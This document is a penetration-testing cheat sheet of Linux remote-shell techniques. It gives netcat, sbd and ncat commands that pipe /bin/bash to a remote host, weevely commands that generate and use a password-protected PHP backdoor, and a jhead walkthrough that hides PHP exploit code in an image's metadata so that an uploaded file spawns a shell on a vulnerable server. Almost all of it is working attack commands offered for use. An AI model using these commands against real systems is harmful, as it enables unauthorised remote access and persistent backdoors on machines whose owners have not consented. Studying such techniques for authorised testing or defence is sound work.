# Linux Shells

## Bash

## Netcat

#### Listen

```bash
nc -lvnp 4444
```

#### Connect

```bash
nc <IP> 4444 /bin/bash
```

## Sbd

#### Listen

```bash
sbd -lvnp 4444
sbd -lvnp 4444 -k BlueTrumpet  # Use an encryption key
```

#### Connect

```bash
sbd <IP> 4444 /bin/bash
sbd <IP> 4444 -e /bin/bash -k BlueTrumpet  # Connect using encryption key
```

## Ncat

#### Listen

```bash
ncat -lvnp 4444 --ssl  # Listen with secure connection
```

#### Connect

```bash
ncat <IP> 4444 -e /bin/bash --ssl  # Connect to secure connection
```

## Weevely

[https://github.com/epinna/weevely3](https://github.com/epinna/weevely3)

```bash
weevely generate bedbug /root/wish.php  # Generate backdoor with password 'bedbug'
weevely http://<IP>/wish.php bedbug  # Uses backdoor to get a shell
```

## Web Shells

```bash
ls /usr/share/webshells  # List the different languages of webshells
```

## Jhead

[https://www.sentex.ca/\~mwandel/jhead/](https://www.sentex.ca/\~mwandel/jhead/)

```bash
mkdir jhead
Download & install jhead
# Turn nsa.jpg into a file that can run commands
jhead -purejpg nsa.jpg  # Sanitize the nsa.jpg image and clear its metadata
jhead -ce nsa.jpg  # Add our exploit code
cp nsa.jpg nsa.php.jpg  # Rename the file to have the php extension so that we get the PHP code executing
# Upload to vulnerable server
# Test exploit: http://<IP>/nsa.php.jpg?cmd=ls
# Get shell: http://<IP>/nsa.php.jpg?cmd=nc -lvnp 4444 -e /bin/bash
#From Kali: nc <IP> 4444
```
